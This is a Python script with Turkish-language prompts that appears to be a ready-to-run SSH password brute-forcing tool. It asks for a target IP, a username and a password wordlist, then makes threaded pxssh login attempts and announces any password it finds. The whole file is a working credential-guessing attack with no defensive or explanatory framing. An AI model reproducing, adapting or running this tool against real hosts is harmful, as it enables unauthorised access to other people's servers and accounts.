#coded by z3di0nn
from pexpect import pxssh
import optparse
import time
from threading import *
import sys
import os

maxConnection = 5
connection_lock = BoundedSemaphore(value=maxConnection)
Found = False
Unfound = True
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("\033[1m\033[34m[+]\033[0;39m \033[1mŞifre bulundu: " + password+"\033[0;39m")
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()



def main():
    os.system("clear")

    host = input("\033[32m\033[1mİP adresini giriniz: \033[0;39m")
    print("\033[1m\033[33m[+]\033[0;39m \033[1mİP > "+host+"\033[0;39m")
    print("")
    user = input("\033[32m\033[1mKullanıcı adı giriniz: \033[0;39m")
    print("\033[1m\033[33m[+]\033[0;39m \033[1mKullanıcı Adı > "+user+"\033[0;39m")
    print("")
    passwFile = input("\033[32m\033[1mWordlist'i giriniz: \033[0;39m")
    print("\033[1m\033[33m[+]\033[0;39m \033[1mWordlist > "   ""+passwFile+  "\033[0;39m")
 
    time.sleep(0.3)
    os.system("clear")
 
    print("\033[1mHazırlanıyor -")
    time.sleep(0.3)
    os.system("clear")

    print("\033[1mHazırlanıyor |")
    time.sleep(0.3)
    os.system("clear")
 
    print("\033[1mHazırlanıyor /")
    time.sleep(0.3)
    os.system("clear")

    print("\033[1mHazırlanıyor -")
    time.sleep(0.3)
    os.system("clear")

    print("\033[1mHazırlanıyor |")
    time.sleep(0.3)
    os.system("clear")

    print("\033[1mHazırlanıyor /")
    time.sleep(0.3)
    os.system("clear")

    print("\033[1mHazırlanıyor -")
    time.sleep(0.3)
    os.system("clear")

    print("\033[1mHazırlanıyor |\033[0;39m")
    time.sleep(0.3)
    os.system("clear")


    fn = open(passwFile, 'r')


    for line in fn.readlines():
        if Found:
            #print("\033[1m\033[94m[*]\033[0;39m Şifre bulundu{exiting}")
            exit(0)
            if Fails > 5:
                print("[!] Bağlantı zaman aşımına uğradı")
                exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("\033[1m\033[91m[-] Deneniyor :\033[0;39m " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == '__main__':
    main()








